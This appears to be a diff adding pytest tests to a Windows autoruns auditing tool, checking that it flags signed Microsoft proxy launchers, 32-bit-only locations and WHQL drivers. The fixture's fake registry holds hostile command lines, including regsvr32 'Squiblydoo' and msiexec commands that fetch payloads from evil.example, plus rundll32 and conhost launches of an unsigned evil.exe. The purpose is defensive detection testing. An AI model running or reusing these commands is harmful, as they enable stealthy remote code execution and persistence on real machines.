@@ -543,3 +543,92 @@ def test_signed_view_unreadable_source_still_reports_the_rest_but_exits_nonzero(
     # Sources that first enumerate subkeys find none in the empty fake
     # registry, so only the ones reading fixed keys hit the failure.
     assert "INCOMPLETE: could not read Run, Winlogon, AppInit, LSA, BootExecute" in result.stdout
+
+
+@pytest.fixture(scope="module")
+def proxy_view(tmp_path_factory):
+    """Microsoft-signed proxy launchers, 32-bit-only locations and a WHQL
+    driver that also reports IsOSBinary."""
+    tmp = tmp_path_factory.mktemp("autoruns_proxy")
+    win = tmp / "Windows"
+    s32, wow = win / "System32", win / "SysWOW64"
+    ms_files = [_file(s32 / name) for name in (
+        "rundll32.exe", "shell32.dll", "url.dll", "regsvr32.exe", "scrobj.dll", "msiexec.exe", "conhost.exe",
+        "onlyx64.dll", "ws64.dll")]
+    ms_files.append(_file(win / "Installer" / "ms.msi"))
+    evil = _file(tmp / "Users" / "x" / "evil.exe", b"MZ evil")
+    wow_dll = _file(wow / "onlyx64.dll", b"MZ 32-bit impostor")
+    lsp32 = _file(wow / "lsp32.dll", b"MZ 32-bit lsp")
+    whql = _file(s32 / "drivers" / "whqlos.sys")
+    registry = {
+        RUN_KEY: {
+            "ShellExec": f"rundll32.exe shell32.dll,ShellExec_RunDLL {evil}",
+            "UrlDll": f"rundll32.exe url.dll,FileProtocolHandler {evil}",
+            "Squiblydoo": "regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll",
+            "RemoteMsi": "msiexec.exe /q /i http://evil.example/x.msi",
+            "Headless": f"conhost.exe --headless {evil}",
+            "SctOnDrive": "regsvr32.exe /s /n /i:C:\\Users\\x\\y.sct scrobj.dll",
+            # Windows uses the same hosts for its own entries - those stay hidden.
+            "MsOptions": "rundll32.exe shell32.dll,Options_RunDLL 0",
+            "MsMsi": f"msiexec.exe /i {win / 'Installer' / 'ms.msi'} /qn",
+        },
+        ACTIVE_SETUP + "\\{44444444-4444-4444-4444-444444444444}": {"StubPath": "regsvr32.exe /s /n /i:U shell32.dll"},
+        APPINIT_KEY: {"AppInit_DLLs": "onlyx64.dll"},
+        APPINIT_KEY.replace("SOFTWARE\\", "SOFTWARE\\WOW6432Node\\"): {"AppInit_DLLs": "onlyx64.dll"},
+        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries\\000000000009": {
+            "PackedCatalogItem": b"%SystemRoot%\\system32\\lsp32.dll\x00junk"},
+        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries64\\000000000010": {
+            "PackedCatalogItem": b"%SystemRoot%\\System32\\ws64.dll\x00junk"},
+        SVC_ROOT + "\\whqlos": {"Start": 1, "Type": 1, "ImagePath": "\\SystemRoot\\System32\\drivers\\whqlos.sys"},
+    }
+    signatures = {path: MS_SIG for path in ms_files}
+    signatures[whql] = ("Valid", "CN=Microsoft Windows Hardware Compatibility Publisher, O=Microsoft Corporation",
+                        "CN=Microsoft Windows Third Party Component CA 2014, O=Microsoft Corporation", True)
+    result, calls = _run_signed_view(tmp, registry, [], signatures, {})
+    assert result.returncode == 0, result.stdout + result.stderr
+    return {"tmp": tmp, "stdout": result.stdout, "calls": calls, "entries": _parse_entries(result.stdout),
+            "evil": evil, "s32": s32, "wow": wow, "wow_dll": wow_dll, "lsp32": lsp32}
+
+
+def test_signed_view_shows_microsoft_proxy_launchers_that_run_foreign_files(proxy_view):
+    evil = str(proxy_view["evil"])
+    for name in ("ShellExec", "UrlDll"):
+        entry = _entry(proxy_view, "Run", name)
+        # The DLL rundll32 loads is Microsoft's; the file in the arguments is not.
+        assert entry["status"] == "Valid"
+        assert entry["Note"] == f"proxy launcher rundll32.exe - its arguments name {evil} (NotSigned)."
+    for name, host, url in (("Squiblydoo", "regsvr32.exe", "http://evil.example/x.sct"),
+                            ("RemoteMsi", "msiexec.exe", "http://evil.example/x.msi")):
+        entry = _entry(proxy_view, "Run", name)
+        assert entry["Note"] == f"proxy launcher {host} - its arguments load {url} from the network."
+    assert _entry(proxy_view, "Run", "SctOnDrive")["Note"] == (
+        "proxy launcher regsvr32.exe - its arguments name C:\\Users\\x\\y.sct, outside the Windows folder.")
+    # conhost --headless only launches its arguments: shown like a script host.
+    assert _entry(proxy_view, "Run", "Headless")["Note"].startswith("script host")
+    shown = {(e["category"], e["name"]) for e in proxy_view["entries"]}
+    for hidden in (("Run", "MsOptions"), ("Run", "MsMsi"), ("ActiveSetup", "{44444444-4444-4444-4444-444444444444}")):
+        assert hidden not in shown, hidden
+    assert "\nRun: 6 / 8\n" in proxy_view["stdout"].replace("\r\n", "\n")
+    # The file named in the arguments is checked like any other file - once.
+    calls = [c.lower() for c in proxy_view["calls"]]
+    assert calls.count(evil.lower()) == 1
+
+
+def test_signed_view_resolves_32_bit_only_locations_in_syswow64(proxy_view):
+    s32, wow = proxy_view["s32"], proxy_view["wow"]
+    appinit = [e for e in proxy_view["entries"] if e["category"] == "AppInit"]
+    # The 64-bit key loads the Microsoft-signed System32 copy (hidden); the
+    # WOW6432Node key loads the unsigned SysWOW64 file of the same name.
+    assert [(e["location"], e["File"], e["status"]) for e in appinit] == [
+        (APPINIT_KEY.replace("SOFTWARE\\", "SOFTWARE\\WOW6432Node\\"), str(proxy_view["wow_dll"]), "NotSigned")]
+    lsp = _entry(proxy_view, "Winsock", "000000000009")
+    assert lsp["File"] == str(proxy_view["lsp32"])
+    assert lsp["status"] == "NotSigned"
+    assert ("Winsock", "000000000010") not in {(e["category"], e["name"]) for e in proxy_view["entries"]}
+    assert str(s32 / "ws64.dll").lower() in [c.lower() for c in proxy_view["calls"]]
+
+
+def test_signed_view_keeps_whql_drivers_even_when_reported_as_os_binary(proxy_view):
+    driver = _entry(proxy_view, "Driver", "whqlos")
+    assert driver["status"] == "Valid"
+    assert driver["Signer"].startswith("CN=Microsoft Windows Hardware Compatibility Publisher")
